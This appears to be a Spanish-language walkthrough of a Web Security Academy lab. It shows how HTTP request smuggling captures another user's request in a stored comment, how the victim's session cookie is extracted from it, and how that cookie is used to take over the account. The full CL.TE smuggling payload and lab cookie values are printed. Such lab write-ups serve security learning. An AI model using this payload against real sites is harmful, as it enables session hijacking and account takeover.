Continuamos con el laboratorio anterior, donde logramos capturar una petición legítima del siguiente usuario mediante un ataque de HTTP request smuggling. En esta parte, analizamos el contenido del comentario almacenado para extraer la cookie de sesión de la víctima.

Una vez identificamos el valor de la ‘**cookie session**‘ en la petición capturada, la utilizamos para suplantar la identidad del usuario y acceder a su cuenta. Este paso demuestra cómo una simple desincronización entre servidores puede derivar en la total toma de control de una cuenta ajena.

Este ejercicio refuerza la gravedad de las vulnerabilidades de tipo request smuggling y cómo pueden comprometer directamente la privacidad e integridad de los usuarios.

Solucion
ahora ya una vez configurado todo el payload en vamos a cambiar el coment en el csrf hasta el ultimo de esta manera quedaria el payloda y en la seccion de comentarios deberias de ver algo asi
![Pasted image 20250807221729.png](imagenes/Pasted image 20250807221729.png)
payload (POST / HTTP/1.1

Host: 0a3e0063039f125e80211c3d00870036.web-security-academy.net

Content-Type: application/x-www-form-urlencoded

Content-Length: 286

Transfer-Encoding: chunked



0



POST /post/comment HTTP/1.1

Content-Type: application/x-www-form-urlencoded

Cookie: session=tIa5AHKbdB1ecVxlgPyGDgocKZ9PSLFf

Content-Length: 950



csrf=MQz6eTcTy7X1z7RI83NowKPgY689AC5l&postId=1&name=testing&email=omar%40omar.com&website=https%3A%2F%2Fcallate.com&comment=prueba)

entonces copiamos la cookie de session
![Pasted image 20250807221842.png](imagenes/Pasted image 20250807221842.png)
y modificamos la cookie de session en el login
![Pasted image 20250807221953.png](imagenes/Pasted image 20250807221953.png)
R9UMrQYOdIskkgFNXMLfJOOIXa0w9S1w 
esperamos y ya esta
![Pasted image 20250807225421.png](imagenes/Pasted image 20250807225421.png)
